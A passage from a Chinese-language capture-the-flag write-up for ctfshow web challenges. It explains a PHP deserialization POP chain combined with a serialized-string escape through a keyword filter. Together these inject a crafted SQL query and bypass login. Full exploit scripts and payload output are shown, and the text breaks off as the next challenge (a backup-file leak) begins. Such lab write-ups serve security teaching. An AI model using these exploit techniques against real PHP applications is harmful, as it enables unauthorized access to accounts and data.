&#125;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;mysqli-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$this</span>-&gt;name);</span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话有两种条件可以返回用户id，第一个是让token等于admin，第二个是让password的md5加密值符合数据库查询结果中的password。但是只有在password的判断语句不满足之后才会对token进行一个赋值操作，再返回用户id，所以实际上也是只能看第二个方法。</p>
<p>我们重点关注那个查询语句</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure>

<p>通过where语句对传入的username去查询相应的id和password。</p>
<p>然后我们再来看update文件中的内容，可以看到要session[login]&#x3D;1 ,才能获得flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里也是调用了update方法，我们来看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Info</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getNewinfo</span>());</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对getNewinfo方法的结果进行一个反序列化，我们转向看这个方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将传入的age和nickname传给Info对象</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;<span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在call里面我们可以看到这里就可以触发我们的login方法，同时传入的参数$sql也是我们可控的，那么假如我们传入一个自定义的id和password，再集合我们自己post传入的password，就可以达到一个绕过的目的，例如我们的查询语句设置为</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure>

<p>这里的话sql查询后返回的就是1的MD5值，也就是c4ca4238a0b923820dcc509a6f75849b，这时候我们让我们的post的password为1，就可以满足条件了</p>
<p>有思路之后我们就开始写pop链</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper:__destruct<span class="function"><span class="params">()</span>-&gt;</span>User:__toString<span class="function"><span class="params">()</span>-&gt;</span>Info:__call<span class="function"><span class="params">()</span>-&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的话为了触发call方法，需要调用一个不存在的方法，在<code>__toString</code>方法中存在一个调用方法的步骤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们让nickname为info类，此时调用了update方法，就可以触发call魔术方法</p>
<p>为了触发toString方法，需要将一个对象像字符串一样操作，然后在UpdateHelper类中看到一个析构方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>,<span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们只要设置sql为一个对象就可以了，这里设置sql为user类，那我们的exp就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;select 1,\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; from user where username=?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$in</span>=<span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$in</span>-&gt;CtrlCase=<span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;nickname=<span class="variable">$in</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$update</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="variable">$update</span>-&gt;sql=<span class="variable">$user</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UpdateHelper:__destruct()-&gt;User:__toString()-&gt;Info:__call()</span></span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line"><span class="variable">$in</span>=<span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$update</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="variable">$update</span>-&gt;sql=<span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;nickname=<span class="variable">$in</span>;</span><br><span class="line"><span class="variable">$in</span>-&gt;CtrlCase=<span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$update</span>);</span><br><span class="line"><span class="comment">//O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题又来了，如何将我们序列化的数据进行反序列化呢，在源码中可以看到这里会序列化一个info类并将结果进行反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Info</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getNewinfo</span>());</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">    <span class="variable">$updateAction</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这里info只传入了两个参数，我们没法对第三个参数进行使用</p>
<p>我们让info传三个参数（除了传入的两个参数，还有一个ctrlcase参数），令这个参数为我们需要序列化的类</p>
<p>当一个对象序列化的时候，其中的对象也会跟着一起序列化。</p>
<p>怎么做呢，就是利用序列化字符串逃逸的手法</p>
<p>在lib.php里还有一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如我们用load去进行逃逸，那么就会多出两个字符</p>
<p>那么最后的exp就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;select 1,\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; from user where username=?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$in</span>=<span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$in</span>-&gt;CtrlCase=<span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;nickname=<span class="variable">$in</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$update</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="variable">$update</span>-&gt;sql=<span class="variable">$user</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//UpdateHelper:__destruct()-&gt;User:__toString()-&gt;Info:__call()</span></span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line"><span class="variable">$in</span>=<span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$update</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="variable">$update</span>-&gt;sql=<span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;nickname=<span class="variable">$in</span>;</span><br><span class="line"><span class="variable">$in</span>-&gt;CtrlCase=<span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$update</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;age=<span class="string">&quot;age123&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;load&quot;</span>,<span class="number">146</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;nickname=<span class="variable">$m</span>.<span class="string">&quot;\&quot;;s:8:\&quot;CtrlCase\&quot;;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$ud</span>).<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$p</span>-&gt;nickname);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311172721888.png" alt="image-20250311172721888"></p>
<p>接着用admin&#x2F;1登录就可以成功拿到flag了</p>
<h2 id="web15-Fishman"><a href="#web15-Fishman" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h2><p>hint1: 备份泄露，代码审计</p>
<p>提示备份泄露那就直接访问<a target="_blank" rel="noopener" href="http://www.zip,果然有/">www.zip，果然有</a></p>
<p>目录结构</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250619130028896.png" alt="image-20250619130028896"></p>
<p>先看一下登录页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 